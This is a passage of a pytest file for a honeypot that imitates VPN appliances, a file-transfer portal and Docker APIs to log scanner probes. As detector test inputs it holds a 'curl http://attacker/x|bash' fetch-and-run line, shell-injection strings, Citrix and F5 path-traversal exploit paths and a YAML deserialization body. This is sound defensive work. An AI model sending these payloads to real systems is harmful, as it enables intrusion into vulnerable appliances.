        "/aspera/faspex/account/logout",
        data=b"--- !ruby/hash:ActionController::Parameters\nexploit: true\n",
        headers={
            "X-Forwarded-For": "203.0.113.82",
            "Content-Type": "application/x-yaml",
        },
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload["status"] == "ok"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "aspera-faspex-logout"
    assert entry["asperaFaspexMethod"] == "POST"
    assert "bodyPreview" in entry


async def test_dispatch_aspera_faspex_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "ASPERA_FASPEX_ENABLED", False)
    resp = await flux_client.get(
        "/aspera/faspex/",
        headers={"X-Forwarded-For": "203.0.113.83"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Fake FortiGate SSL VPN trap (CVE-2024-21762 / CVE-2023-27997 bait) ---


def test_fortigate_vpn_enabled_by_default():
    assert tbenv.FORTIGATE_VPN_ENABLED


def test_fortigate_vpn_default_paths_match_observed_probes():
    for path in (
        "/remote/login",
        "/remote/logincheck",
        "/remote/fgt_lang",
        "/remote/error",
        "/api/v2/cmdb/system/admin",
        "/api/v2/cmdb/system/status",
        "/api/v2/cmdb/system/global",
        "/api/v2/monitor/router/policy",
    ):
        assert tbenv.is_fortigate_vpn_path(path), f"expected match: {path}"


def test_fortigate_vpn_path_non_match():
    for path in (
        "/",
        "/remote/",
        "/remote/login.cgi",  # close, but not the FortiOS path
        "/api/v2/cmdb/",
        "/api/v2/cmdb/firewall/policy",  # not a fingerprint path we serve
        "/.env",
    ):
        assert not tbenv.is_fortigate_vpn_path(path), f"unexpected match: {path}"


def test_fortigate_vpn_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "FORTIGATE_VPN_ENABLED", False)
    assert not tbenv.is_fortigate_vpn_path("/remote/login")


def test_render_fortigate_login_html_shape():
    body = tbenv.render_fortigate_login_html("fortigate.example", "7.4.4", "2662").decode("utf-8")
    assert "/remote/logincheck" in body
    assert "FortiOS 7.4.4" in body
    assert "build 2662" in body
    assert "fortigate.example" in body


def test_render_fortigate_logincheck_format():
    body = tbenv.render_fortigate_logincheck()
    assert b"ret=1" in body
    assert b"redir=" in body


def test_render_fortigate_admin_json_shape():
    payload = json.loads(tbenv.render_fortigate_admin_json("7.4.4", "2662"))
    assert payload["http_status"] == 401
    assert payload["status"] == "error"
    assert payload["version"] == "v7.4.4"
    assert payload["build"] == 2662


def test_render_fortigate_status_json_includes_version_banner():
    payload = json.loads(tbenv.render_fortigate_status_json("fortigate.example", "7.4.4", "2662"))
    assert payload["status"] == "success"
    assert payload["results"]["version"] == "v7.4.4"
    assert payload["results"]["hostname"] == "fortigate.example"
    assert payload["results"]["serial"].startswith("FGVM")


def test_render_fortigate_router_policy_json_envelope():
    payload = json.loads(tbenv.render_fortigate_router_policy_json())
    assert payload["status"] == "success"
    assert payload["path"] == "router"
    assert payload["name"] == "policy"
    assert payload["results"] == []


def test_extract_fortigate_logincheck_form_credential_field():
    body = b"username=admin&credential=h%26unter2&ajax=1"
    username, has_password = tbenv.extract_fortigate_logincheck_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "admin"
    assert has_password is True


def test_extract_fortigate_logincheck_form_password_field_fallback():
    body = b"username=root&password=toor"
    username, has_password = tbenv.extract_fortigate_logincheck_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "root"
    assert has_password is True


def test_fortigate_has_cmd_injection_indicators():
    # CVE-2024-21762 PoC + classic shell-meta payloads.
    assert tbenv._fortigate_has_cmd_injection("uname -a; id", "")
    assert tbenv._fortigate_has_cmd_injection("", "id=$(id)")
    assert tbenv._fortigate_has_cmd_injection("curl http://attacker/x|bash", "")
    assert not tbenv._fortigate_has_cmd_injection("plain string", "username=admin")


def test_fortigate_status_serial_is_per_request_unique():
    a = json.loads(tbenv.render_fortigate_status_json("h", "7.4.4", "2662"))["results"]["serial"]
    b = json.loads(tbenv.render_fortigate_status_json("h", "7.4.4", "2662"))["results"]["serial"]
    assert a != b, "serial must be per-request unique — never a fixed literal"


async def test_dispatch_fortigate_login_landing(flux_client):
    resp = await flux_client.get(
        "/remote/login?lang=en",
        headers={"X-Forwarded-For": "203.0.113.91", "Host": "fortigate.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "/remote/logincheck" in text
    assert "FortiOS 7.4.4" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "fortigate-login"
    assert entry["fortigatePath"] == "/remote/login"


async def test_dispatch_fortigate_logincheck_logs_username_and_sets_svpn_cookie(flux_client):
    resp = await flux_client.post(
        "/remote/logincheck",
        data="username=admin&credential=h%26unter2&ajax=1",
        headers={
            "X-Forwarded-For": "203.0.113.92",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "ret=1" in text
    set_cookie = resp.headers.get("Set-Cookie", "")
    assert "SVPNCOOKIE=" in set_cookie

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "fortigate-logincheck"
    assert entry["fortigateUsername"] == "admin"
    assert entry["fortigateHasPassword"] is True
    assert "credential" not in entry  # secret value never logged


async def test_dispatch_fortigate_logincheck_cookie_per_request_unique(flux_client):
    cookies = []
    for i in range(2):
        resp = await flux_client.post(
            "/remote/logincheck",
            data=f"username=u{i}&credential=p",
            headers={
                "X-Forwarded-For": f"203.0.113.{93 + i}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        assert resp.status == 200
        cookies.append(resp.headers.get("Set-Cookie", ""))
    assert cookies[0] != cookies[1]
    assert "SVPNCOOKIE=" in cookies[0]
    assert "SVPNCOOKIE=" in cookies[1]


async def test_dispatch_fortigate_admin_returns_permission_denied(flux_client):
    resp = await flux_client.get(
        "/api/v2/cmdb/system/admin",
        headers={"X-Forwarded-For": "203.0.113.95"},
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload["http_status"] == 401
    assert payload["status"] == "error"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "fortigate-cmdb-admin"


async def test_dispatch_fortigate_router_policy_flags_cmd_injection(flux_client):
    resp = await flux_client.post(
        "/api/v2/monitor/router/policy",
        data=b'{"name":"x;id"}',
        headers={
            "X-Forwarded-For": "203.0.113.96",
            "Content-Type": "application/json",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "fortigate-monitor-router-policy"
    assert entry["fortigateHasCmdInjection"] is True


async def test_dispatch_fortigate_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "FORTIGATE_VPN_ENABLED", False)
    resp = await flux_client.get(
        "/remote/login",
        headers={"X-Forwarded-For": "203.0.113.97"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Citrix NetScaler / Gateway portal (CVE-2019-19781 / CVE-2023-3519 /
#     CVE-2023-4966 / CVE-2022-27510 bait) ---


def test_citrix_gateway_enabled_by_default():
    assert tbenv.CITRIX_GATEWAY_ENABLED


def test_citrix_gateway_default_paths_match_observed_probes():
    for path in (
        "/vpn/index.html",
        "/logon/LogonPoint/index.html",
        "/vpn/js/rdx/core/lang/rdx_en.json.gz",
        "/cgi/login",
        "/p/u/doAuthentication.do",
        "/Citrix/XenApp/auth/login.aspx",
    ):
        assert tbenv.is_citrix_gateway_path(path), f"expected match: {path}"


def test_citrix_gateway_path_non_match():
    for path in (
        "/",
        "/vpn/",
        "/logon/",
        "/cgi/",
        "/Citrix/",
        "/.env",
        "/remote/login",  # FortiGate, not Citrix
    ):
        assert not tbenv.is_citrix_gateway_path(path), f"unexpected match: {path}"


def test_citrix_gateway_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "CITRIX_GATEWAY_ENABLED", False)
    assert not tbenv.is_citrix_gateway_path("/vpn/index.html")


def test_render_citrix_gateway_index_html_shape():
    body = tbenv.render_citrix_gateway_index_html("citrix.example", "NS13.1: Build 49.13.nc").decode("utf-8")
    assert "/cgi/login" in body
    assert "NetScaler Gateway" in body
    assert "NS13.1" in body
    assert "citrix.example" in body


def test_render_citrix_logonpoint_html_uses_same_post_action():
    body = tbenv.render_citrix_logonpoint_html("citrix.example", "NS13.1").decode("utf-8")
    assert "/cgi/login" in body
    assert "Logon Point" in body or "log on" in body.lower()


def test_render_citrix_xenapp_login_html_form_action():
    body = tbenv.render_citrix_xenapp_login_html("xenapp.example").decode("utf-8")
    assert "/Citrix/XenApp/auth/login.aspx" in body
    assert "Citrix XenApp" in body


def test_render_citrix_login_post_reflects_login_value():
    # The submitted login is reflected in the noscript fallback so the
    # failure page isn't a static body across hits.
    body = tbenv.render_citrix_login_post("alice").decode("utf-8")
    assert "alice" in body
    body_html_safe = tbenv.render_citrix_login_post("bob").decode("utf-8")
    assert "bob" in body_html_safe


def test_extract_citrix_gateway_form_login_passwd():
    body = b"login=admin&passwd=h%26unter2&dummy_username=ctx_dummy_username"
    username, has_password = tbenv.extract_citrix_gateway_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "admin"
    assert has_password is True


def test_extract_citrix_gateway_form_xenapp_user_password():
    # XenApp StoreFront uses `user` + `password` (not `login` + `passwd`).
    body = b"user=alice&password=secret&domain="
    username, has_password = tbenv.extract_citrix_gateway_form(
        body, "application/x-www-form-urlencoded",
    )
    assert username == "alice"
    assert has_password is True


def test_citrix_has_cmd_injection_indicators():
    # CVE-2019-19781 path-traversal pattern (Shitrix).
    assert tbenv._citrix_has_cmd_injection("", "/vpn/../vpns/portal/scripts/newbm.pl", "")
    assert tbenv._citrix_has_cmd_injection("", "/vpn/%2f..%2fvpns/portal/x", "")
    # Generic shell-meta in the body.
    assert tbenv._citrix_has_cmd_injection("login=admin;wget http://x/y", "/cgi/login", "")
    # Plain login POST is not flagged.
    assert not tbenv._citrix_has_cmd_injection("login=admin&passwd=p", "/cgi/login", "")


async def test_dispatch_citrix_vpn_index_landing(flux_client):
    resp = await flux_client.get(
        "/vpn/index.html",
        headers={"X-Forwarded-For": "203.0.113.150", "Host": "citrix.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "/cgi/login" in text
    assert "NetScaler Gateway" in text
    assert resp.headers.get("Server") == "NetScaler"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "citrix-vpn-index"
    assert entry["citrixGatewayPath"] == "/vpn/index.html"


async def test_dispatch_citrix_logonpoint_uses_mixed_case_path(flux_client):
    # Real scanners send `/logon/LogonPoint/index.html` with that casing;
    # confirm the case-insensitive match still routes to the handler.
    resp = await flux_client.get(
        "/logon/LogonPoint/index.html",
        headers={"X-Forwarded-For": "203.0.113.151"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "citrix-logonpoint"


async def test_dispatch_citrix_cgi_login_logs_username_and_sets_nsc_aaac_cookie(flux_client):
    resp = await flux_client.post(
        "/cgi/login",
        data="login=admin&passwd=h%26unter2&dummy_username=ctx_dummy_username",
        headers={
            "X-Forwarded-For": "203.0.113.152",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    set_cookie = resp.headers.get("Set-Cookie", "")
    assert "NSC_AAAC=" in set_cookie

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "citrix-cgi-login"
    assert entry["citrixUsername"] == "admin"
    assert entry["citrixHasPassword"] is True
    assert "passwd" not in entry  # secret value never logged


async def test_dispatch_citrix_cgi_login_cookie_per_request_unique(flux_client):
    cookies = []
    for i in range(2):
        resp = await flux_client.post(
            "/cgi/login",
            data=f"login=u{i}&passwd=p",
            headers={
                "X-Forwarded-For": f"203.0.113.{160 + i}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        assert resp.status == 200
        cookies.append(resp.headers.get("Set-Cookie", ""))
    assert cookies[0] != cookies[1]
    assert "NSC_AAAC=" in cookies[0]
    assert "NSC_AAAC=" in cookies[1]


async def test_dispatch_citrix_xenapp_login_aspx_posts_log_credentials(flux_client):
    resp = await flux_client.post(
        "/Citrix/XenApp/auth/login.aspx",
        data="user=alice&password=secret&domain=",
        headers={
            "X-Forwarded-For": "203.0.113.155",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "citrix-xenapp-login"
    assert entry["citrixUsername"] == "alice"
    assert entry["citrixHasPassword"] is True


async def test_dispatch_citrix_flags_path_traversal_cmd_injection(flux_client):
    # Even though `/vpn/../vpns/...` would fail nginx normalisation in
    # practice, the cmd-injection flag is what we want to assert when
    # the indicator string survives in the request body.
    resp = await flux_client.post(
        "/cgi/login",
        data="login=admin&passwd=x&extra=/vpn/../vpns/portal/scripts/newbm.pl",
        headers={
            "X-Forwarded-For": "203.0.113.157",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "citrix-cgi-login"
    assert entry["citrixHasCmdInjection"] is True


async def test_dispatch_citrix_gateway_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CITRIX_GATEWAY_ENABLED", False)
    resp = await flux_client.get(
        "/vpn/index.html",
        headers={"X-Forwarded-For": "203.0.113.158"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Palo Alto GlobalProtect trap ---


def test_globalprotect_enabled_by_default():
    assert tbenv.GLOBALPROTECT_ENABLED


def test_globalprotect_default_paths_match_observed_probes():
    for p in [
        "/global-protect/prelogin.esp",
        "/ssl-vpn/prelogin.esp",
        "/global-protect/login.esp",
        "/global-protect/getconfig.esp",
    ]:
        assert tbenv.is_globalprotect_path(p), f"{p} should match"


def test_globalprotect_path_non_match():
    for p in ["/", "/remote/login", "/vpn/index.html", "/global-protect"]:
        assert not tbenv.is_globalprotect_path(p), f"{p} should NOT match"


def test_globalprotect_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "GLOBALPROTECT_ENABLED", False)
    assert not tbenv.is_globalprotect_path("/global-protect/prelogin.esp")


def test_globalprotect_path_strips_query_string():
    assert tbenv.is_globalprotect_path(
        "/global-protect/prelogin.esp?tmp=tmp&clientVer=4100&clientos=Windows"
    )


async def test_dispatch_globalprotect_prelogin_returns_xml(flux_client):
    resp = await flux_client.get(
        "/global-protect/prelogin.esp?tmp=tmp&clientVer=4100",
        headers={"X-Forwarded-For": "203.0.113.160", "Host": "gp.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<prelogin-cookie>" in text
    assert "<panos-version>" in text
    assert resp.headers.get("Server") == "PanWeb Server/"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "globalprotect-prelogin"


async def test_dispatch_globalprotect_login_get_returns_html(flux_client):
    resp = await flux_client.get(
        "/global-protect/login.esp",
        headers={"X-Forwarded-For": "203.0.113.161"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "GlobalProtect Portal" in text
    assert 'name="user"' in text


async def test_dispatch_globalprotect_login_post_logs_username(flux_client):
    resp = await flux_client.post(
        "/global-protect/login.esp",
        data="user=admin&passwd=secret123",
        headers={
            "X-Forwarded-For": "203.0.113.162",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Invalid credential" in text
    assert "PHPSESSID" in resp.headers.get("Set-Cookie", "")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "globalprotect-login"
    assert entry["globalprotectUsername"] == "admin"
    assert entry["globalprotectHasPassword"] is True


async def test_dispatch_globalprotect_getconfig_returns_xml(flux_client):
    resp = await flux_client.get(
        "/global-protect/getconfig.esp",
        headers={"X-Forwarded-For": "203.0.113.163", "Host": "gp.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<portal>" in text
    assert "<gateways>" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "globalprotect-getconfig"


async def test_dispatch_globalprotect_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "GLOBALPROTECT_ENABLED", False)
    resp = await flux_client.get(
        "/global-protect/prelogin.esp",
        headers={"X-Forwarded-For": "203.0.113.164"},
    )
    assert resp.status == 404


# --- Sophos SSL VPN trap ---


def test_sophos_vpn_enabled_by_default():
    assert tbenv.SOPHOS_VPN_ENABLED


def test_sophos_vpn_default_paths_match_observed_probes():
    for p in ["/svpn/index.cgi", "/userportal/webpages/myaccount/login.jsp",
              "/userportal/", "/userportal/webpages/"]:
        assert tbenv.is_sophos_vpn_path(p), f"{p} should match"


def test_sophos_vpn_path_non_match():
    for p in ["/", "/svpn", "/vpn/index.html"]:
        assert not tbenv.is_sophos_vpn_path(p), f"{p} should NOT match"


def test_sophos_vpn_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "SOPHOS_VPN_ENABLED", False)
    assert not tbenv.is_sophos_vpn_path("/svpn/index.cgi")


async def test_dispatch_sophos_vpn_login_returns_html(flux_client):
    resp = await flux_client.get(
        "/svpn/index.cgi",
        headers={"X-Forwarded-For": "203.0.113.170", "Host": "sophos.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "SSL VPN Login" in text
    assert 'name="username"' in text
    assert "JSESSIONID" in resp.headers.get("Set-Cookie", "")

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "sophos-vpn-login"


async def test_dispatch_sophos_vpn_post_logs_username(flux_client):
    resp = await flux_client.post(
        "/svpn/index.cgi",
        data="username=admin&password=test123",
        headers={
            "X-Forwarded-For": "203.0.113.171",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "sophos-vpn-login"
    assert entry["sophosUsername"] == "admin"
    assert entry["sophosHasPassword"] is True


async def test_dispatch_sophos_vpn_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "SOPHOS_VPN_ENABLED", False)
    resp = await flux_client.get(
        "/svpn/index.cgi",
        headers={"X-Forwarded-For": "203.0.113.172"},
    )
    assert resp.status == 404


# --- Barracuda SSL VPN trap ---


def test_barracuda_vpn_enabled_by_default():
    assert tbenv.BARRACUDA_VPN_ENABLED


def test_barracuda_vpn_default_paths_match_observed_probes():
    for p in ["/myvpn", "/cgi-mod/index.cgi"]:
        assert tbenv.is_barracuda_vpn_path(p), f"{p} should match"


def test_barracuda_vpn_path_strips_query_string():
    assert tbenv.is_barracuda_vpn_path(
        "/myvpn?sess=none&hdlc_framing=no&ipv4=1&ipv6=1"
    )


def test_barracuda_vpn_path_non_match():
    for p in ["/", "/vpn", "/myvpn2"]:
        assert not tbenv.is_barracuda_vpn_path(p), f"{p} should NOT match"


def test_barracuda_vpn_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "BARRACUDA_VPN_ENABLED", False)
    assert not tbenv.is_barracuda_vpn_path("/myvpn")


async def test_dispatch_barracuda_vpn_tunnel_negotiation(flux_client):
    resp = await flux_client.get(
        "/myvpn?sess=none&hdlc_framing=no&ipv4=1&ipv6=1",
        headers={"X-Forwarded-For": "203.0.113.180"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "CONNECT" in text
    assert "hdlc_framing=no" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "barracuda-vpn-tunnel"


async def test_dispatch_barracuda_vpn_login_returns_html(flux_client):
    resp = await flux_client.get(
        "/cgi-mod/index.cgi",
        headers={"X-Forwarded-For": "203.0.113.181", "Host": "barracuda.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Barracuda Networks SSL VPN" in text
    assert 'name="username"' in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "barracuda-vpn-login"


async def test_dispatch_barracuda_vpn_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "BARRACUDA_VPN_ENABLED", False)
    resp = await flux_client.get(
        "/myvpn",
        headers={"X-Forwarded-For": "203.0.113.182"},
    )
    assert resp.status == 404


# --- F5 BIG-IP APM trap ---


def test_f5_bigip_enabled_by_default():
    assert tbenv.F5_BIGIP_ENABLED


def test_f5_bigip_default_paths_match_observed_probes():
    for p in ["/my.policy", "/tmui/login.jsp", "/sslvpnclient"]:
        assert tbenv.is_f5_bigip_path(p), f"{p} should match"


def test_f5_bigip_tmui_prefix_match():
    assert tbenv.is_f5_bigip_path(
        "/tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp"
    )
    assert tbenv.is_f5_bigip_path("/tmui/logmein.html")


def test_f5_bigip_path_non_match():
    for p in ["/", "/vpn/index.html", "/my.policies"]:
        assert not tbenv.is_f5_bigip_path(p), f"{p} should NOT match"


def test_f5_bigip_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "F5_BIGIP_ENABLED", False)
    assert not tbenv.is_f5_bigip_path("/my.policy")


async def test_dispatch_f5_bigip_my_policy_returns_html_with_session(flux_client):
    resp = await flux_client.get(
        "/my.policy",
        headers={"X-Forwarded-For": "203.0.113.190", "Host": "bigip.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "BIG-IP Access Policy" in text
    assert 'name="username"' in text
    assert "MRHSession" in resp.headers.get("Set-Cookie", "")
    assert resp.headers.get("Server") == "BigIP"

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "f5-bigip-apm-policy"


async def test_dispatch_f5_bigip_tmui_login_returns_html(flux_client):
    resp = await flux_client.get(
        "/tmui/login.jsp",
        headers={"X-Forwarded-For": "203.0.113.191"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Configuration Utility" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "f5-bigip-tmui"


async def test_dispatch_f5_bigip_tmui_path_traversal_flagged(flux_client):
    resp = await flux_client.get(
        "/tmui/login.jsp/..;/tmui/locallb/workspace/fileread.jsp",
        headers={"X-Forwarded-For": "203.0.113.192"},
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "f5-bigip-tmui"
    assert entry["f5HasPathTraversal"] is True


async def test_dispatch_f5_sslvpnclient_returns_xml(flux_client):
    resp = await flux_client.get(
        "/sslvpnclient?launchplatform=mac&neProto=3",
        headers={"X-Forwarded-For": "203.0.113.193"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "<sslvpn>" in text
    assert "<status>enabled</status>" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "f5-sslvpnclient"


async def test_dispatch_f5_bigip_my_policy_session_per_request_unique(flux_client):
    cookies = set()
    for _ in range(3):
        resp = await flux_client.get(
            "/my.policy",
            headers={"X-Forwarded-For": "203.0.113.194"},
        )
        cookies.add(resp.headers.get("Set-Cookie", ""))
    assert len(cookies) == 3, "MRHSession cookie should be unique per request"


async def test_dispatch_f5_bigip_post_logs_username(flux_client):
    resp = await flux_client.post(
        "/my.policy",
        data="username=admin&password=pass123",
        headers={
            "X-Forwarded-For": "203.0.113.195",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "f5-bigip-apm-policy"
    assert entry["f5Username"] == "admin"
    assert entry["f5HasPassword"] is True


async def test_dispatch_f5_bigip_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "F5_BIGIP_ENABLED", False)
    resp = await flux_client.get(
        "/my.policy",
        headers={"X-Forwarded-For": "203.0.113.196"},
    )
    assert resp.status == 404


# --- Docker Registry V2 API trap ---


def test_docker_registry_enabled_by_default():
    assert tbenv.DOCKER_REGISTRY_ENABLED


def test_docker_registry_version_check_path():
    assert tbenv.is_docker_registry_path("/v2/")
    assert tbenv.is_docker_registry_path("/v2")


def test_docker_registry_catalog_path():
    assert tbenv.is_docker_registry_path("/v2/_catalog")


def test_docker_registry_tags_path():
    assert tbenv.is_docker_registry_path("/v2/internal/api-gateway/tags/list")
    assert tbenv.is_docker_registry_path("/v2/myrepo/tags/list")


def test_docker_registry_manifest_path():
    assert tbenv.is_docker_registry_path("/v2/myrepo/manifests/latest")
    assert tbenv.is_docker_registry_path("/v2/internal/auth-service/manifests/sha256:" + "a" * 64)
    assert tbenv.is_docker_registry_path("/v2/myrepo/manifests/v1.2.3")


def test_docker_registry_blob_path():
    assert tbenv.is_docker_registry_path("/v2/myrepo/blobs/sha256:" + "b" * 64)


def test_docker_registry_path_non_match():
    for path in (
        "/",
        "/v2/.env",
        "/v2/api-docs",
        "/api/v2/foo",
        "/v3/_catalog",
        "/v2/keys/?recursive=true",
    ):
        assert not tbenv.is_docker_registry_path(path), f"unexpected match: {path}"


def test_docker_registry_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "DOCKER_REGISTRY_ENABLED", False)
    assert not tbenv.is_docker_registry_path("/v2/_catalog")
    assert not tbenv.is_docker_registry_path("/v2/")


@pytest.mark.asyncio
async def test_dispatch_docker_registry_version_check(flux_client):
    resp = await flux_client.get(
        "/v2/",
        headers={"X-Forwarded-For": "203.0.113.200"},
    )
    assert resp.status == 200
    assert resp.headers.get("Docker-Distribution-Api-Version") == "registry/2.0"
    body = await resp.json()
    assert body == {}


@pytest.mark.asyncio
async def test_dispatch_docker_registry_catalog(flux_client):
    resp = await flux_client.get(
        "/v2/_catalog",
        headers={"X-Forwarded-For": "203.0.113.200"},
    )
    assert resp.status == 200
    assert resp.headers.get("Docker-Distribution-Api-Version") == "registry/2.0"
    body = await resp.json()
    assert "repositories" in body
    assert isinstance(body["repositories"], list)
    assert len(body["repositories"]) > 0


@pytest.mark.asyncio
async def test_dispatch_docker_registry_tags(flux_client):
    resp = await flux_client.get(
        "/v2/internal/api-gateway/tags/list",
        headers={"X-Forwarded-For": "203.0.113.200"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["name"] == "internal/api-gateway"
    assert "latest" in body["tags"]


@pytest.mark.asyncio
async def test_dispatch_docker_registry_manifest(flux_client):
    resp = await flux_client.get(
        "/v2/internal/api-gateway/manifests/latest",
        headers={"X-Forwarded-For": "203.0.113.200"},
    )
    assert resp.status == 200
    assert "docker.distribution.manifest" in resp.headers.get("Content-Type", "")
    body = await resp.json()
    assert body["schemaVersion"] == 2
    assert len(body["layers"]) > 0
    assert body["config"]["digest"].startswith("sha256:")


@pytest.mark.asyncio
async def test_dispatch_docker_registry_blob(flux_client):
    digest = "sha256:" + "a" * 64
    resp = await flux_client.get(
        f"/v2/internal/api-gateway/blobs/{digest}",
        headers={"X-Forwarded-For": "203.0.113.200"},
    )
    assert resp.status == 200
    assert resp.headers.get("Content-Type") == "application/octet-stream"
    body = await resp.read()
    assert body[:2] == b"\x1f\x8b"  # gzip magic


@pytest.mark.asyncio
async def test_dispatch_docker_registry_auth_header_logged(flux_client):
    resp = await flux_client.get(
        "/v2/_catalog",
        headers={
            "X-Forwarded-For": "203.0.113.200",
            "Authorization": "Basic dXNlcjpwYXNz",
        },
    )
    assert resp.status == 200
    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-registry-catalog"]
    assert len(entries) >= 1
    assert entries[-1].get("dockerAuthHeader") == "Basic dXNlcjpwYXNz"


@pytest.mark.asyncio
async def test_dispatch_docker_registry_mutation_logged(flux_client):
    resp = await flux_client.post(
        "/v2/internal/api-gateway/manifests/latest",
        headers={"X-Forwarded-For": "203.0.113.200"},
        data=b'{"test":"manifest"}',
    )
    assert resp.status == 200
    entries = [e for e in _log_entries(flux_client.log_path) if e.get("result") == "docker-registry-manifest"]
    assert len(entries) >= 1
    assert entries[-1].get("dockerMutationMethod") == "POST"
    assert entries[-1].get("dockerBodySha256")


@pytest.mark.asyncio
async def test_dispatch_docker_registry_unknown_repo_returns_404(flux_client):
    resp = await flux_client.get(
        "/v2/nonexistent-repo-xyz/tags/list",
        headers={"X-Forwarded-For": "203.0.113.200"},
    )
    # Even unknown repos get a tags response — the trap serves any repo name
    assert resp.status == 200


@pytest.mark.asyncio
async def test_dispatch_docker_registry_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "DOCKER_REGISTRY_ENABLED", False)
    resp = await flux_client.get(
        "/v2/_catalog",
        headers={"X-Forwarded-For": "203.0.113.200"},
    )
    assert resp.status == 404


# --- Docker Engine API (daemon on 2375) trap ---


def test_docker_daemon_enabled_by_default():
    assert tbenv.DOCKER_DAEMON_ENABLED


def test_docker_daemon_exact_endpoints():
    for path in (
        "/version",
        "/info",
        "/_ping",
        "/containers/json",
        "/images/json",
        "/images/create",
        "/containers/create",
    ):
        assert tbenv.is_docker_daemon_path(path), f"expected match: {path}"


def test_docker_daemon_api_version_prefix():
    for path in (
        "/v1.41/version",
        "/v1.43/containers/json",
        "/v1.40/info",
        "/v1.24/_ping",
    ):
        assert tbenv.is_docker_daemon_path(path), f"expected match: {path}"


def test_docker_daemon_ssrf_colon_port_prefix():
    # Literal `:2375`, single-encoded `%3a2375`, and double-encoded
    # `%253a2375` — all observed shapes from SSRF / proxy-chain
    # scanners that ship the host:port inside the URL path.
    for path in (
        "/:2375/containers/json",
        "/%3a2375/containers/json",
        "/%253a2375/containers/json",
        "/%3A2375/version",          # uppercase encoding
        "/%253A2375/_ping",
    ):
        assert tbenv.is_docker_daemon_path(path), f"expected match: {path}"


def test_docker_daemon_container_stage_paths():
    cid = "a" * 64
    for stage in ("start", "stop", "kill", "wait", "exec", "json", "attach", "restart"):
        assert tbenv.is_docker_daemon_path(f"/containers/{cid}/{stage}")
